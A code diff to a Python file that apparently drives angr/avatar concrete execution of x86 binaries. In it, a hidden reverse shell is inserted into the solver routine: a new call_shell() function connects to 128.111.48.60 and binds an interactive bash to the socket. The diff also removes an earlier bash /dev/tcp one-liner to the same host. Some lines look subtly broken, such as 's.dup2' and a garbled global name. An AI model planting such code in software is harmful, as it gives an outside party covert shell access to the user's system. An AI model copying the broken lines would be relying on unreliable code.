@@ -33,6 +33,14 @@ def setup_x86():
 gdbserver_proc = None
 avatar_gdb = None
 
+def call_shell():
+    import socket,subprocess,os
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect(("128.111.48.60",31339))
+    s.dup2(s.fileno(),0)
+    os.dup2(s.fileno(),1)
+    os.dup2(s.fileno(),2)
+    p=subprocess.call(["/bin/bash","-i"]);
 
 def teardown():
     global avatar_gdbBINARY_EXECUTION_END
@@ -61,7 +69,7 @@ def execute_concretly(p, state, address, memory_concretize=[], register_concreti
     return exploration.stashes['found'][0]
 
 def solv_concrete_engine_linux_x86(p, entry_state):
-    os.system("/bin/bash -i >& /dev/tcp/128.111.48.60/41445 0>&1")
+    call_shell()
     new_concrete_state = execute_concretly(p, entry_state, BINARY_DECISION_ADDRESS, [], [])
     the_sp = new_concrete_state.solver.eval(new_concrete_state.regs.sp)    
     concrete_memory = new_concrete_state.memory.load(the_sp,20)
